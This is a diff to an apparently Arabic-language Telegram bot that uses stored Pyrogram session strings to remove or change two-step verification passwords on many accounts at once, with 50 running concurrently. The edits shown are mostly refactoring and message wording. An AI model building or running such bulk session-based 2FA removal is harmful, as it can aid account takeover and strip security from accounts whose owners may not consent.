-# 🔐 إدارة التحقق بخطوتين (سريع - 50 عامل متزامن)
+# 2. استقبال الضغطة بعد اختيار الحساب المكتوبة بصيغة (act:2fa_remove:id)
 # =========================================================
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("act:2fa_remove:") or call.data.startswith("act:2fa_change:"))
+@bot.callback_query_handler(func=lambda call: call.data and (call.data.startswith("act:2fa_remove:") or call.data.startswith("act:2fa_change:")))
 def handle_2fa_action(call):
     if not is_allowed(call.from_user.id): return
     
-    action = call.data.split(":")[1] # إما 2fa_remove أو 2fa_change
-    target_id = call.data.split(":")[2] # إما all أو أيدي الحساب
+    parts = call.data.split(":")
+    action = parts[1] # إما 2fa_remove أو 2fa_change
+    target_id = parts[2] # إما all أو أيدي الحساب المحدد
     
     USER_STATES[call.from_user.id] = {
         "action": action,
@@ -2955,7 +3213,7 @@ def process_current_password(message):
     state["current_password"] = current_pass
     
     if state["action"] == "2fa_remove":
-        status_msg = bot.send_message(message.chat.id, "⏳ جـاري حـذف كـلـمـة الـمـرور بـسـرعـة 50 اتـصـال...")
+        status_msg = bot.send_message(message.chat.id, "⏳ جـاري حـذف كـلـمـة الـمـرور بـسـرعـة (50 عـامـل)...")
         run_async(execute_2fa_async(uid, status_msg.chat.id, status_msg.message_id, state["target"], "remove", current_pass))
         del USER_STATES[uid]
         
@@ -2972,17 +3230,16 @@ def process_new_password(message):
     new_pass = message.text.strip()
     current_pass = state["current_password"]
     
-    status_msg = bot.send_message(message.chat.id, "⏳ جـاري تـعـيـيـن كـلـمـة الـمـرور بـسـرعـة 50 اتـصـال...")
+    status_msg = bot.send_message(message.chat.id, "⏳ جـاري تـعـيـيـن كـلـمـة الـمـرور بـسـرعـة (50 عـامـل)...")
     run_async(execute_2fa_async(uid, status_msg.chat.id, status_msg.message_id, state["target"], "change", current_pass, new_pass))
     del USER_STATES[uid]
 
 
-# ---------------------------------------------------------
-# المهام المتزامنة (50 حساب بنفس الوقت)
-# ---------------------------------------------------------
+# =========================================================
+# 3. دوال الـ Pyrogram المتزامنة (50 حساب بنفس الوقت)
+# =========================================================
 
 async def process_single_2fa(acc_id, phone, pyro_session, action, current_pass, new_pass=None):
-    # استخدام حسابات 50 عامل بنفس الوقت مثل بقية الدوال
     async with account_semaphore: 
         client = Client(f"2fa_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
@@ -3023,18 +3280,17 @@ async def execute_2fa_async(owner_id, chat_id, msg_id, target, action, current_p
     if not accounts:
         return bot.edit_message_text("❌ لا تـوجـد حـسـابـات مـضـافـة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
 
-    # بناء قائمة المهام (50 مهمة مع بعض)
     tasks = [
         process_single_2fa(acc_id, phone, pyro_session, action, current_pass, new_pass)
         for acc_id, phone, _, _, pyro_session in accounts
     ]
     
-    # التنفيذ المتزامن الشامل باستخدام gather
     results = await asyncio.gather(*tasks)
     
     final_text = f"🛂┊ نـتـيـجـة إدارة الـتـحـقـق بـخـطـوتـيـن:\n\n" + "".join(results)
     
     bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
+
 
 # =========================================================
 # ✉️ الأوامر
